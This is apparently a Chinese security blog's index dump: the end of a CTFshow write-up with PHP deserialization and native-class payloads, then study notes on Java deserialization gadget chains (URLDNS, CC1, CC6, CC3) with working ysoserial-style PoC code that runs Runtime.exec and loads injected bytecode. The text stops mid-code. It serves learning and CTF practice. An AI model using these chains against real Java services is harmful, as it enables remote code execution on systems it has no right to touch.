修改i:0\na%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A0%3BN%3B%7D easyweb 页面源码提示/?source\n\u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;source\u0026#39;])){ highlight_file(__FILE__); echo \u0026#34;\\$flag_filename = \u0026#39;flag\u0026#39;.md5(???).\u0026#39;php\u0026#39;;\u0026#34;; die(); } if(isset($_POST[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;b\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;c\u0026#39;])){ $c = $_POST[\u0026#39;c\u0026#39;]; $count[++$c] = 1; if($count[] = 1) {\t// ??? $count[++$c] = 1; print_r($count); die(); }else{ $a = $_POST[\u0026#39;a\u0026#39;]; $b = $_POST[\u0026#39;b\u0026#39;]; echo new $a($b);\t// 原生类 } } ?\u0026gt; 原生类我知道，但是我注释???的地方卡了好久，后来知道这里考的是数组溢出（淦\nc=9223372036854775806\u0026amp;a=DirectoryIterator\u0026amp;b=glob://flag[0-9a-z]*.php c=9223372036854775806\u0026amp;a=SplFileObject\u0026amp;b=flag56ea8b83122449e814e0fd7bfb5f220a.php 不摆烂从我做起（x\n","date":"2022-03-28T10:04:27+08:00","permalink":"https://amiaaaz.github.io/2022/03/28/ctfshow-0222-juanwangcup-wp/","section":"posts","tags":["wp"],"title":"CTFshow0222卷王杯 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"序列化\u0026amp;反序列化 与PHP类似，java的readObject对标__wakeup，但不完全一样，readObject倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的__wakeup倾向于解决“反序列化后如何初始化这个对象”的问题，它可以在反序列化之后执行初始化操作，该赋的值基本由__construct控制，真正的入手点一般在__destruct中\n对java来说，一个可利用的readObject是链子最初的起点\n在序列化对象时会调用对象的writeObject方法，参数类型是ObjectOutputStream，这个类有一个annotateClass方法，可以通过重写这个方法来向序列化后的数据中写入内容，这个内容位于objectAnnotation中\n相应的，反序列化时会调用readObject，可以读出前面写入的内容进行处理\npython的反序列化危害最大，可以直接操控PVM栈上的指令\nURLDNS public class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * \u0026lt;p\u0026gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.\u0026lt;/p\u0026gt; * * \u0026lt;b\u0026gt;Potential false negative:\u0026lt;/b\u0026gt; * \u0026lt;p\u0026gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.\u0026lt;/p\u0026gt; */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } 这是yoserial中URLDNS部分的源码，很短\n整个链子的攻击利用的是HashMap会调用key的hashCode方法来定位对应的value，当url object作为key时会由于hashCode的计算进而触发DNS请求（因为要解析hostname是否指向同一个Ip\nHashMap private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { ObjectInputStream.GetField fields = s.readFields(); // Read loadFactor (ignore threshold) float lf = fields.get(\u0026#34;loadFactor\u0026#34;, 0.75f); if (lf \u0026lt;= 0 || Float.isNaN(lf)) throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); HashMap.UnsafeHolder.putLoadFactor(this, lf); reinitialize(); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal mappings count: \u0026#34; + mappings); } else if (mappings == 0) { // use defaults } else if (mappings \u0026gt; 0) { float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u0026lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what we\u0026#39;re actually creating. SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] tab = (Node\u0026lt;K,V\u0026gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 这是它重写的readObject方法，在最后一行对key计算hash值，会触发hashCode方法，而计算hashCode时会触发DNS的请求\n构造链子时我们需要初始化一个java.net.URL对象作为HashMap的key，之后将这个对象的hashCode设为-1，强制在反序列化时重新计算hashCode，触发后续调用\n另外在ysoserial的payload生成时为了防止执行DNS请求，使用了SilentURLStreamHandler\nCC1(\u0026lt;8u71 在p牛的java安全漫谈中给出了CC1的极简版demo\npublic class testCC1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;amiz\u0026#34;); } } 前置 首先理解一下没见过的几个函数\nTransformer 一个接口，只有一个待实现的transform方法\npublic interface Transformer{ public Object transform(Object input); } TransformedMap TransformedMap对innerMap作了修饰，传出的outerMap是修饰后的M\nMap outerMap = TransformedMap.decorate(innerMap, KeyTransformer, valueTransformer); keyTransformer是处理新元素key的回调，valueTransformer是处理新元素value的回调；这里的回调并不是回调函数 而是一个实现了上面Transformer接口的类\nConstantTransformer public ConstantTransformer(Object constantToReturn){ super(); iConstant = constantToReturn; } public Object transform(Object input){ return iConstant; } 是一个实现了Transformer接口的类，它的过程类似构造函数时传入一个对象，在transform方法中将这个对象返回，作用是包装任意一个对象，在执行回调时返回这个对象，方便后续操作\nInvokerTransformer 也是一个实现了Transformer接口的类，类可以用来执行任意方法，这也是反序列化能RCE的关键\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args){ super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } 第一个参数是待执行的方法名，第二个参数是方法的参数类型，第三个是传入的参数\n之后的回调transform方法执行input对象的iMethodName方法\npublic Object transform(Object input){ if(input == null){ return null; } try{ Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); }catch(NoSuchMethodException ex){ throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); }catch(IllegalAccessException ex){ throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); }catch(InvocationTargetException ex){ throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, ex); } } ChainedTransformer 也是一个实现了Transformer接口的类，作用是将内部多个Transformer串在一起\npublic ChainedTransformer(Transformer[] transformers){ super(); iTransformers = transformers; } public Object transform(Object object){ for(int i = 0; i \u0026lt; iTransformers.length; i++){ object = iTransformers[i].transform(object); } return object; } 前一个回调返回的结果可以作为后一个回调的参数传入\ndemo 然后再来看demo\npublic class testCC1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;amiz\u0026#34;); } } 我们创建了一个ChainedTransformer，包含ConstantTransformer（得到Runtime对象）和InvokerTransformer（执行代码部分），这个ChainedTransformer只是作为回调部分，我们用TransformedMap.decorate对它进行包装，最后通过outerMap.put 向Map中放入新元素触发回调，进而执行命令\nTransformedMap package ysoserial.payloads; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.Map; public class testCC1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[]{\u0026#34;calc.exe\u0026#34;} ), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxx\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object) ois.readObject(); } } 仅有demo的代码不足以构造完全可用的poc，实际的反序列化中，不同于手工执行outerMap.put()，我们离不开一个合适的readObject触发outerMap.put-\u0026gt;transform\n这里用到的是sun.reflect.annotation.AnnotationInvocationHandler，看一下它的readObject\nprivate void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { throw new InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) { Entry var5 = (Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) \u0026amp;\u0026amp; !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \u0026#34;[\u0026#34; + var8 + \u0026#34;]\u0026#34;)).setMember((Method)var2.members().get(var6))); } } } } 代码比较好看懂，先是得到前面传入的Map（我们传入经过TransformedMap修饰的对象），之后依次遍历，到了setValue时会触发transform的回调\n所以我们构造POC时需要创建AnnotationInvocationHandler对象，并把前面的HashMap传进来作为Map参数\nClass cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); 同时因为AnnotationInvocationHandler是内部类不能直接new，我们用反射+setAccessible(true)的方式实例化；并且由于Runtime.getRuntime没有实现序列化的接口，所以我们用反射获取当前上下文的Runtime对象\n另外，为了满足readObject中的var7!=null的判断，要满足\nsun.reflect.annotation.AnnotationInvocationHandler构造函数的第一个参数为Annotation的子类，且必须至少含有一个方法，假设方法名为X 被TransformedMap.decorate修饰的Map中必有一个键名为X的元素 8u71之后的版本修改了AnnotationInvocationHandler的readObject函数，不再使用反序列化得到的Map对象，而是新建了LinkedHashMap对象，把原来的key-value添加进去，所以后续对Map的操作都是基于这个LinkedHashMap对象，不会再触发set或put了\n最后把对象生成序列化流\nByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close; LazyMap package ysoserial.payloads; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import ysoserial.payloads.annotation.Authors; import ysoserial.payloads.annotation.Dependencies; import ysoserial.payloads.annotation.PayloadTest; import ysoserial.payloads.util.Gadgets; import ysoserial.payloads.util.JavaVersion; import ysoserial.payloads.util.PayloadRunner; import ysoserial.payloads.util.Reflections; /* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collections */ @SuppressWarnings({\u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34;}) @PayloadTest ( precondition = \u0026#34;isApplicableJavaVersion\u0026#34;) @Dependencies({\u0026#34;commons-collections:commons-collections:3.1\u0026#34;}) @Authors({ Authors.FROHOFF }) public class CommonsCollections1 extends PayloadRunner implements ObjectPayload\u0026lt;InvocationHandler\u0026gt; { public InvocationHandler getObject(final String command) throws Exception { final String[] execArgs = new String[] { command }; // inert chain for setup final Transformer transformerChain = new ChainedTransformer( new Transformer[]{ new ConstantTransformer(1) }); // real chain for after setup final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class); final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy); Reflections.setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers); // arm with actual transformer chain return handler; } public static void main(final String[] args) throws Exception { PayloadRunner.run(CommonsCollections1.class, args); } public static boolean isApplicableJavaVersion() { return JavaVersion.isAnnInvHUniversalMethodImpl(); } } ysoserial用的是与TransformedMap类似的LazyMap，两者的区别在于TransformedMap是在执行put操作时回调transform，而LazyMap是在get方法中执行的factory.transform，在get找不到值才会调用factory.transform去获取一个值（所谓Lazy\npublic Object get(Object key){ if(map.containsKey(key) == false){ Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } LazyMap的利用比TransformedMap复杂，因为AnnotationInvocationHandler覆写的readObject中并没有直接使用Map的get，所以这里选择通过java对象代理的技术来触发它的invoke 进而到get\n我们知道对象代理可以在运行期动态创建某个interface的实例，可以编写InvocationHandler来实现接口的方法调用，可以做到加工和覆写（也正是叫做Proxy的原因 对接口进行Proxy 省去中间类），类似PHP魔术方法中的__call 可以劫持对象内部的方法调用，用到java.reflect.Proxy\nMap proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); 第一个参数ClassLoader我们使用默认的即可，第二个是我们需要代理的对象集合，第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体的代理逻辑\n比如一个覆写了invoke方法的ExampleInvocationHandler类\nimport java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.Map; public class ExampleInvocationHandler implements InvocationHandler { protected Map map; public ExampleInvocationHandler(Map map){ this.map = map; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable{ if(method.getName().compareTo(\u0026#34;get\u0026#34;) == 0){ System.out.println(\u0026#34;Hookmethod: \u0026#34; + method.getName()); return \u0026#34;Hacked Object\u0026#34;; } return method.invoke(this.map, args); } } 作用是监控到调用的方法名是get时返回Hacked Object字符串，我们尝试外部调用它\nimport java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws Exception{ InvocationHandler handler = new ExampleInvocationHandler(new HashMap()); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); proxyMap.put(\u0026#34;hello\u0026#34;, \u0026#34;world\u0026#34;); String result = (String) proxyMap.get(\u0026#34;hello\u0026#34;); System.out.println(result); } } 回显Hook methd: get Hacked Object\n回看sun.reflect.annotation.AnnotationInvocationHandler，如果我们把这个对象用Proxy进行代理，那么readObject时只要调用任意方法 就会进入AnnotationInvocationHandler#invoke触发get\n构造 先是用LazyMap替换TransformedMap\nMap outerMap = LazyMap.decorate(innerMap, transformerChain); 然后对sun.reflect.annotation.AnnotationInvocationHandler进行Proxy\nClass cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); 代理后的对象是proxyMap，但是不能直接对其序列化 我们的入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject，还要再用AnnotationInvocationHandler对这个proxyMap包裹\nhandler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap); 注意到ysoserial的末尾有new ConstantTransformer(1)，可以隐藏启动进程的日志特征\n————注意：LazyMap的CC1同样无法解决8u71后的使用问题，尽管它的漏洞触发在get和invoke，和setValue无关\nCC6 上面提到CC1由于sun.reflect.annotation.AnnotationInvocationHandler#readObject在8u71后的逻辑变化导致失效，这里来看一条解决高版本Java利用的CC6（代码部分来自p牛\n/* -\u0026gt; Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() */ CC6解决CC1的方案是在上下文中寻找其它可以调用LazyMap.get的地方，用到的是org.apache.commons.collections.keyvalue.TiedMapEntry\npackage org.apache.commons.collections.keyvalue; import java.io.Serializable; import java.util.Map; import java.util.Map.Entry; import org.apache.commons.collections.KeyValue; public class TiedMapEntry implements Entry, KeyValue, Serializable { private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) { this.map = map; this.key = key; } public Object getKey() { return this.key; } public Object getValue() { return this.map.get(this.key); } // ... public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } // .. } 在它的getValue中调用了this.map.get，而hashCode方法调用了getValue（HashMap的实现原理），在ysoserial中是利用java.util.HashSet#readObject到HashMap#put()到HashMap#hash(key)最后到TiedMapEntry#hashCode()\n在p牛的简化poc中省略了前两步，通过HashMap#readObject直接到HashMap#hash(key)，hash中调用了key.hashCode（纯HashMap的实现原理\n构造poc，我们只需要让这个key等于TiedMapEntry对象，再改动亿点点\n首先是恶意LazyMap\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class testCC6 { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)}; // 避免生成payload时触发RCE Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object.class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[]{\u0026#34;calc.exe\u0026#34;} ), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain);\t// 得到被装饰后的恶意LazyMap对象 TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;keykey\u0026#34;); Map expMap = new HashMap();\t// 为了调用TiedMapEntry#hashCode 新建HashMap 并把tme作为key expMap.put(tme, \u0026#34;valuevalue\u0026#34;); outerMap.remove(\u0026#34;keykey\u0026#34;); // put也会调用hash(key) 避免对后面get的影响 Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;);\t// 替换真正的transformers f.setAccessible(true); f.set(transformerChain, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream();\t// 序列化部分 ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); System.out.println(barr);\t// 触发 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object) ois.readObject(); } } 逻辑是比较清晰的，每一部分也都比较好懂\nCC3(\u0026lt;8u71 由于TemplatesImpl可以直接控制字节码（即java代码），所以尝试结合CC1 demo和执行字节码的部分就可以构造出CC3（的一部分）了，需要注意的是要将InvokerTransformer执行的方法从显式的rce（getRuntime.exec）变为调用TemplatesImpl::newTransformer\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class testCC3mini { public static void main(String[] args) throws Exception{ byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=\u0026#34;); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{code}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(obj), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null ) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;amiz\u0026#34;); } public static void setFieldValue(Object obj, String fieldName, Object value)throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 但是并不是标准的payload，ysoserial中并没有用到InvokerTransformer，原因是SerialKiller的存在限制了它，我们换为com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\n这个类的构造方法中调用了了(TransformerImpl) templates.newTransformer()，免去了我们的手工调用\n缺少InvokerTransformer无法调用TraAXFilter的构造方法，这里用org.apache.commons.collections.functors.InstantiateTransformer这个Transformer\n所以我们利用InstantiateTransformer调用到TrAXFilter的构造方法，再利用它构造方法中的templates.newTransformer调用到TemplatesImpl里的字节码\nTransformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[]{Templates.class}, new Object[]{obj}) }; 完整CC3\npackage ysoserial.payloads; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.TransformedMap; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class testCC3 { public static void main(String[] args) throws Exception { TemplatesImpl obj = new TemplatesImpl(); // setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new 